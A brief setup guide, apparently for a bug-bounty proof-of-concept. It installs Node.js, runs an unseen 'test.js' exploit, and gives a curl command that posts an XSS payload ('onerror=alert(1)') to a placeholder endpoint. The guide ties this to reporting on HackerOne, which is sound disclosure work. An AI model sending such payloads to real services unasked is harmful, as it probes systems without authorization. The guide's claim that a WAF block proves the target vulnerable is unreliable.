In order to use this test file, please follow the instructions below:

Dependencies required are npm and node.js

sudo su
apt-get update
apt-get install nodejs
apt-get install npm

Once done. Clone the repository and follow these commands:

npm init -y
npm install http

Finally, run the exploit using this command:

node test.js

Done.

Please note that if you receive any errors such as 301 Permanently Moved by CloudFlare then it's obviously CloudFlare that's blocking the endpoint from receiving the request. Nonetheless, this test will work in other ways.

To check if a WAF is responsible for the 301 Permanently Moved, confirm with a curl command: 

curl -X POST -H "Content-Type: application/json" -d '{"device_id":"<img src=x onerror=alert(1)>"}' [HOSTNAME OF THE VULNERABLE ENDPOINT]/[THE VULNERABLE ENDPOINT]

If you receive an error from the WAF saying that the request was blocked due to the execution of an arbitrary code such as SQL then the target is vulnerable and you can report it to HackerOne.
